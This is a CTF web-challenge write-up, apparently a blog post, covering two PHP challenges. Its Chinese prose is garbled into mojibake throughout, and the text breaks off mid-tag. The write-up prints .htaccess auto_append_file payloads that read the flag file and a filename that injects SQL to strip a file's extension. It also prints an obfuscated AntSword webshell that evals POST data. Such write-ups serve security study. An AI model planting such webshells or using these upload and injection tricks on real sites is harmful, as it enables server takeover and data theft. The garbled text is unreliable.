ï¼ˆéš¾åº¦ï¼š8/10ï¼‰</h2><p>é¦–å…ˆä½¿ç”¨å¾¡å‰‘ä¸“ä¸šç‰ˆæ‰«æä¸€ä¸‹ç›®å½•ï¼š</p><p><img src="/img/fe559a7ed170a262e055fef1679db42a.png"></p><p>æ‰“å¼€/robots.txtæ–‡ä»¶åå¦‚å›¾ï¼ŒæŒ‡å‘äº†å¦ä¸€ä¸ªç½‘ç«™è·¯å¾„ï¼š</p><p><img src="/img/593f27f33ea1a56d4e0a2e6f8e424d99.png"></p><p>æ‰“å¼€åé¡µé¢å†…åŒ…å«äº†ç½‘ç«™æºä»£ç ï¼Œäºæ˜¯è¿›è¡Œä»£ç å®¡è®¡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">master</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$path</span>;</span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$name</span>;</span><br><span class="line">Â Â Â Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">stream_open</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/(.*)\/(.*)$/s&#x27;</span>,<span class="variable">$path</span>,<span class="variable">$array</span>,<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$a</span>=<span class="variable">$array</span>[<span class="number">1</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â parse_str(<span class="variable">$array</span>[<span class="number">2</span>],<span class="variable">$array</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>]))</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">$this</span>-&gt;path=<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">else</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">$this</span>-&gt;name=<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">else</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">$this</span>-&gt;upload(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">elseif</span>(<span class="variable">$a</span>===<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="keyword">$this</span>-&gt;search(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">else</span>Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">upload</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^uploads\/[a-z]&#123;10&#125;\/$/is&#x27;</span>,<span class="variable">$path</span>)||<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$filename</span>=<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$filename</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=str_replace(urldecode(<span class="string">&#x27;%03&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$file</span>=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file:|http|pre|etc/is&#x27;</span>,<span class="variable">$file</span>))</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;illegalbbbbbb!&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â file_put_contents(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â file_put_contents(<span class="variable">$path</span>.<span class="string">&#x27;user.jpg&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;uploadÂ success!&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">search</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!is_dir(<span class="variable">$path</span>))</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;illegal!&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$files</span>=scandir(<span class="variable">$path</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">foreach</span>(<span class="variable">$filesÂ as</span>Â <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>(str_ireplace(<span class="variable">$name</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$v</span>)!==<span class="variable">$v</span>)</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$v</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">stream_eof</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="literal">true</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">stream_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">function</span>Â <span class="title">stream_stat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â </span><br><span class="line">&#125;</span><br><span class="line">Â </span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;phar&#x27;</span>);</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">stream_wrapper_register(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;master&#x27;</span>);</span><br><span class="line">Â </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>parse_str()</code> å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡<code>array</code>ä¸­ï¼Œ<code>stream_open()</code>å‡½æ•°å¯¹<code>path</code>çš„ä¼ å‚å’Œ<code>name</code>çš„ä¼ å‚ä»å­—ç¬¦ä¸²å¯¹åº”åˆ°å˜é‡ï¼Œ<code>upload()</code>å‡½æ•°è¿‡æ»¤äº†ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼ŒåŒ…æ‹¬<code>/file:\|http\|pre\|etc/is</code>ä»¥åŠ<code>\&lt;&quot; â€™.</code>å‡è¢«è¿‡æ»¤ï¼Œ<code>search()</code>å‡½æ•°åˆ¤æ–­æ˜¯å¦å­˜åœ¨å’Œ<code>name</code>ç›¸åŒçš„æ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œå¹¶æ›¿æ¢ä¸ºç©ºå¹¶åˆ—å‡ºå½“å‰ç›®å½•ã€‚</p><p>åœ¨å¤´åƒä¸Šä¼ é¡µé¢å‘ç°ç–‘ä¼¼æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä½†å°è¯•ä¸Šä¼ åæç¤ºç­‰çº§å¤ªä½ï¼Œæ— æ³•ä¸Šä¼ ã€‚</p><p><img src="/img/602f51299652793045bc0d8c67ac9a5c.png"></p><p>æ³¨å†Œåä¸ªè´¦æˆ·ï¼Œå¹¶å¡«å†™æ¨èäººåè·å¾—ç§¯åˆ†100ï¼Œæ­¤æ—¶å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><p><img src="/img/017ff5dd11dab77b51566d73744f5fa3.png"></p><p>å°è¯•ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä¸Šä¼ æˆåŠŸä½†æ— æ³•æ‰§è¡Œï¼Œæ€€ç–‘è§¦å‘äº†å…³é”®è¯è¿‡æ»¤ï¼Œåœ¨å·²ä¸Šä¼ ç›®å½•é‡Œæ‰“å¼€åï¼Œå¦‚ä¸Šæ–‡ä»£ç å®¡è®¡çš„ç»“è®ºï¼Œ<code>/file:\|http\|pre\|etc/is</code>ä»¥åŠ&lt;â€œ â€™.æœç„¶è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯æƒ³åˆ°å°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚æ„é€ ç¬¬ä¸€ä¸ªpayloadæœç´¢flagæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_valueÂ auto_append_fileÂ master:<span class="comment">//search/path=%2fhome%2f&amp;name=flag</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>%2f</code>æ˜¯ä¸ºäº†ç»•è¿‡â€™<code>/</code>â€™çš„æ­£åˆ™åŒ¹é…æ³•åˆ™ã€‚</p><p>ä¸Šä¼ .htaccessæ–‡ä»¶åå·²ç»å¯ä»¥æ­£å¸¸ä¸Šä¼ .phpæ–‡ä»¶ï¼š</p><p><img src="/img/40ab785485498af9a2ba7c46ecfdfbaf.png"></p><p> è®¿é—®1.phpå³å¯å¾—åˆ°flagæ–‡ä»¶åï¼š</p><p><img src="/img/fce008b44f6d51502954d6c593fcae97.png"></p><p>ç„¶åå†ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_valueÂ auto_append_fileÂ /home/hiahiahia_flag</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å†è®¿é—®ä¹‹å‰çš„1.phpå†…å®¹å·²å˜ä¸ºï¼š</p><p><img src="/img/0fa649675dc50497bf7130c94cc97324.png"></p><p>å¾—åˆ°flagã€‚</p><h2 id="filemanager-ï¼ˆéš¾åº¦ï¼š8-10ï¼‰"><a href="#filemanager-ï¼ˆéš¾åº¦ï¼š8-10ï¼‰" class="headerlink" title="filemanager ï¼ˆéš¾åº¦ï¼š8/10ï¼‰"></a>filemanager ï¼ˆéš¾åº¦ï¼š8/10ï¼‰</h2><p>é¦–å…ˆä½¿ç”¨å¾¡å‰‘ä¸“ä¸šç‰ˆæ‰«æï¼š</p><p><img src="/img/eb880eb3071a4c07664d58962095859c.png"></p><p>æ‰“å¼€ç¬¬ä¸€ä¸ªï¼Œå‘ç°æºä»£ç æ³„éœ²ï¼Œè¿›è¡Œä»£ç å®¡è®¡ï¼š</p><p>å‘ç°åç«¯ä»£ç ä½¿ç”¨äº†ç™½åå•ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä¸Šä¼ æœ¨é©¬ï¼ŒåŒæ—¶è¯¥ç‰ˆæœ¬ä¹Ÿä¸èƒ½ä½¿ç”¨<code>%00</code>æˆªæ–­ï¼Œä½†å‘ç°ç½‘ç«™æœ‰renameåŠŸèƒ½ï¼Œè§‚å¯Ÿrename.phpçš„ä»£ç ï¼š</p><p><img src="/img/659d5215596d2b447627c9f3501f17b3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>])Â &amp;&amp;Â <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]))Â &#123;</span><br><span class="line">Â Â Â Â <span class="variable">$resultÂ </span>=Â <span class="variable">$db</span>-&gt;query(<span class="string">&quot;selectÂ *Â fromÂ `file`Â whereÂ `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (<span class="variable">$result</span>-&gt;num_rowsÂ &gt;Â <span class="number">0</span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$resultÂ </span>=Â <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">Â Â Â Â &#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">exit</span>(<span class="string">&quot;oldÂ fileÂ doesn&#x27;tÂ exists!&quot;</span>);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>Â (<span class="variable">$result</span>)Â &#123;</span><br><span class="line">Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]Â =Â basename(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$reÂ </span>=Â <span class="variable">$db</span>-&gt;query(<span class="string">&quot;updateÂ `file`Â setÂ `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;,Â `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;Â whereÂ `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (!<span class="variable">$re</span>)Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">exit</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$oldnameÂ </span>=Â UPLOAD_DIRÂ .Â <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>]Â .Â <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$newnameÂ </span>=Â UPLOAD_DIRÂ .Â <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>]Â .Â <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (file_exists(<span class="variable">$oldname</span>))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â rename(<span class="variable">$oldname</span>,Â <span class="variable">$newname</span>);</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="variable">$urlÂ </span>=Â <span class="string">&quot;/&quot;</span>Â .Â <span class="variable">$newname</span>;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;YourÂ fileÂ isÂ rename,Â url:</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &lt;aÂ href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot;Â target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &lt;aÂ href=\&quot;/\&quot;&gt;goÂ back&lt;/a&gt;&quot;</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€€ç–‘å¯ä»¥é€šè¿‡å‰ç«¯åŠŸèƒ½renameè¿›è¡Œsqlæ³¨å…¥ï¼Œä½¿å…¶extensionå€¼ä¸ºç©ºï¼š</p><p><img src="/img/59d4725d744f8f2d8367cf42dfe89972.png"></p><p>ç„¶åä¿®æ”¹æ–‡ä»¶æ·»åŠ .phpåç¼€ï¼Œä½¿ç½‘ç«™å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªåä¸º<code>&#39;,extension=&#39;.txt</code>çš„txtæ–‡ä»¶ç”¨æ¥sqlæ³¨å…¥ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶åä¸ºattack.txtï¼š</p><p><img src="/img/87ca205ac372b908b6414ff07eae00f6.png"></p><p>è¿™æ ·ï¼Œæ–°çš„æ–‡ä»¶åå°±å˜æˆäº†attack.txt.txtï¼Œç»è¿‡ä¸Šé¢é«˜äº®çš„æ•°æ®åº“updateè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` <span class="keyword">set</span> `filename`<span class="operator">=</span><span class="string">&#x27;attack.txt&#x27;</span>, `oldname`<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,extension<span class="operator">=</span>â€™â€™ <span class="keyword">where</span> `fid`<span class="operator">=</span>&#123;$<span class="keyword">result</span>[<span class="string">&#x27;fid&#x27;</span>]&#125;&quot;</span><br></pre></td></tr></table></figure><p>attack.txtçš„extensionå°±å˜ä¸ºç©ºã€‚äºæ˜¯æˆ‘ä»¬å†ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åç›¸åŒçš„æœ¨é©¬æ–‡ä»¶ï¼Œåˆ©ç”¨Antswordæ’ä»¶ç”Ÿæˆæœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â <span class="variable">$lVeL</span>=create_function(chr(<span class="number">15876</span>/<span class="number">441</span>).base64_decode(<span class="string">&#x27;cw==&#x27;</span>).chr(<span class="number">894</span>-<span class="number">783</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).str_rot13(<span class="string">&#x27;r&#x27;</span>),chr(<span class="number">01223</span>-<span class="number">01056</span>).chr(<span class="number">0104160</span>/<span class="number">0450</span>).str_rot13(<span class="string">&#x27;n&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).base64_decode(<span class="string">&#x27;KA==&#x27;</span>).str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0107147</span>/<span class="number">0475</span>).chr(<span class="number">31302</span>/<span class="number">282</span>).chr(<span class="number">0x2ef</span>-<span class="number">0x282</span>).chr(<span class="number">471</span>-<span class="number">370</span>).chr(<span class="number">01237</span>-<span class="number">01166</span>).chr(<span class="number">55932</span>/<span class="number">948</span>));<span class="variable">$lVeL</span>(base64_decode(<span class="string">&#x27;NDU3O&#x27;</span>.<span class="string">&#x27;DI2O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">528</span>-<span class="number">443</span>).chr(<span class="number">58581</span>/<span class="number">849</span>).base64_decode(<span class="string">&#x27;OQ==&#x27;</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).base64_decode(<span class="string">&#x27;Vg==&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0533</span>-<span class="number">0425</span>).base64_decode(<span class="string">&#x27;dA==&#x27;</span>).str_rot13(<span class="string">&#x27;w&#x27;</span>).chr(<span class="number">55500</span>/<span class="number">555</span>).str_rot13(<span class="string">&#x27;J&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;10XSk&#x27;</span>.<span class="string">&#x27;7MTM3&#x27;</span>.<span class="string">&#x27;MzQ3O&#x27;</span>.<span class="string">&#x27;Ds=&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åç”±äº<code>\$result[â€œextensionâ€]</code>å·²ç»é€šè¿‡æ³¨å…¥å˜ä¸ºç©ºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸º.phpæ–‡ä»¶ã€‚</p><p><img src="/img/fc4be299b9b03fd1881a80e2d8290bed.png"></p><p><img src="/img/81828d2b0adce03312bad2d98886eb75.png"></p><p>ä½¿ç”¨Antswordè¿æ¥å¯ä»¥æ‹¿åˆ°flagã€‚</p><p><img 